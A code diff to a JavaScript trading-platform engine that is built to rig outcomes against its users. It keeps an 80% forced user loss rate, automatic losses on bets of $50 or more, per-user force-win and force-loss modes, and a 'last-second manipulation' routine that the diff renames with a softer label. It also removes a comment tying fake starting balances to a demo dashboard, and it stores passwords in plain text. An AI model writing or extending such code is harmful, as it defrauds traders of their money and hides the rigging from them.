@@ -5,9 +5,9 @@ class MarketEngine {
     this.openTrades = [];
     this.tradeHistory = [];
     
-    // Risk Engine Control
-    this.globalHouseEdge = 80; // Default 80% user loss rate
-    this.bigBetThreshold = 50; // $50+ bets auto loss
+    // Manipulation & Risk Rules
+    this.globalHouseEdge = 80; // 80% loss rate for users
+    this.bigBetThreshold = 50; // $50+ bets auto-loss
     this.userModes = {}; // { userId: 'AUTO' | 'FORCE_WIN' | 'FORCE_LOSS' }
 
     this.users = {};
@@ -19,7 +19,7 @@ class MarketEngine {
   }
 
   registerUser(fullName, email, password, phone, refCode) {
-    if (this.users[email]) return { success: false, message: 'Email is already registered' };
+    if (this.users[email]) return { success: false, message: 'Email already registered' };
     const user = { 
       id: 'USR_' + Math.floor(1000 + Math.random() * 9000), 
       fullName: fullName || 'Trader',
@@ -27,7 +27,7 @@ class MarketEngine {
       password, 
       phone: phone || 'N/A', 
       refCode: refCode || 'NONE',
-      mainWallet: 24534.00, // Matching Cotex Dashboard Demo
+      mainWallet: 24534.00,
       tradingWallet: 12450.00,
       bonusWallet: 2500.00,
       demoBalance: 10000.00,
@@ -143,7 +143,7 @@ class MarketEngine {
     };
   }
 
-  // Geometric Brownian Motion Tick Generator
+  // Geometric Brownian Motion Algorithm
   generateNextTick() {
     const dt = 0.1;
     const drift = (Math.random() - 0.499) * 0.00002;
@@ -163,7 +163,7 @@ class MarketEngine {
     this.openTrades.push(trade);
   }
 
-  // Institutional Last-Second Manipulation Logic
+  // Institutional Last-Second Micro-Shift Algorithm
   processManipulations() {
     const now = Date.now();
 
